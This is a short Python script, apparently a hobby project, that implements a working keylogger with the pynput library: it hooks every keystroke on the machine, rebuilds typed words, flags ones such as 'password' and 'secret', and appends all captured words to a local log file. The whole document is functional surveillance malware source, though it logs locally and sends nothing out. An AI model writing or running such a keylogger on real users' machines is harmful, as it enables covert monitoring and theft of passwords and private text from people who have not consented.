#Plans: proper word detection
#

import os
from pynput.keyboard import Listener, Key
from datetime import datetime

#buffer for storing keystrokes 
key_buffer = ""

#detection word examples
target_words = ["password", "secret", "top secret", "russian", "fortnite"]

#destination of keylog
log_directory = "Personal Projects/Cyber/Keylogger/logs"
os.makedirs(log_directory, exist_ok=True)
log_file = os.path.join(log_directory, "keylog_output.txt")

def log_key(key):
    global key_buffer

    try:
        # convert key to string & add buffer
        key_buffer += key.char
    except AttributeError:
        # convert Key.space to just " "
        if key == Key.space:
            key_buffer += " "
        # convert Key.backspace to just "bs"
        elif key == Key.backspace:
            key_buffer = key_buffer[:-1]
        # convert any other to just title
        else:
            key_buffer += f" <{key}> "

    #Check for words in buffer
    if ' ' in key_buffer or '\n' in key_buffer:       
        words = key_buffer.split()
        for word in words:
            if word in target_words:
                print(f"WORD DETECTED: {word}\n")
                with open(log_file, 'a') as file:
                    file.write(f"Detected: {word}\n")
                #remove word from buffer
                key_buffer = key_buffer.replace(word, "")
            else:
                print(f"Undetected: {word}\n")
                with open(log_file, "a") as file:
                    file.write(f"{word}\n")
                #remove word from buffer
                key_buffer = key_buffer.replace(word, "")

        key_buffer = ""
           
    if len(key_buffer) > 100:
        key_buffer = key_buffer[-100:]       
    

#start program
with Listener(on_press=log_key) as listener:
    listener.join()